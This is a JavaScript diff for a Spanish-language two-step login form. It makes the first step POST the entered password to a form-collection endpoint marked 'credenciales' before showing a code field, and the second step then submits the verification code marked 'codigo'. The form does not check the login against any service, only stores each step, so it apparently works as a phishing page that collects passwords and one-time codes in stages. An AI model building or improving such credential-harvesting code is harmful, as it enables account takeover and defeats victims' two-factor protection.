@@ -39,10 +39,32 @@ continueBtn.addEventListener('click', () => {
     passwordInput.reportValidity();
     return;
   }
-  step1.hidden = true;
-  step2.hidden = false;
-  codeInput.required = true;
-  codeInput.focus();
+
+  continueBtn.disabled = true;
+  continueBtn.textContent = 'Enviando...';
+
+  const data = new FormData(form);
+  data.set('form-name', 'login');
+  data.set('etapa', 'credenciales'); // marca este envío como el paso 1
+
+  fetch('/', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams(data).toString(),
+  })
+    .then(() => {
+      step1.hidden = true;
+      step2.hidden = false;
+      codeInput.required = true;
+      codeInput.focus();
+    })
+    .catch(() => {
+      alert('Hubo un problema al enviar tus datos. Intenta de nuevo.');
+    })
+    .finally(() => {
+      continueBtn.disabled = false;
+      continueBtn.textContent = 'Continuar';
+    });
 });
 
 backBtn.addEventListener('click', () => {
@@ -59,6 +81,8 @@ codeInput.addEventListener('input', () => {
 form.addEventListener('submit', (e) => {
   e.preventDefault();
   const data = new FormData(form);
+  data.set('form-name', 'login');
+  data.set('etapa', 'codigo'); // marca este envío como el paso 2
   fetch('/', {
     method: 'POST',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
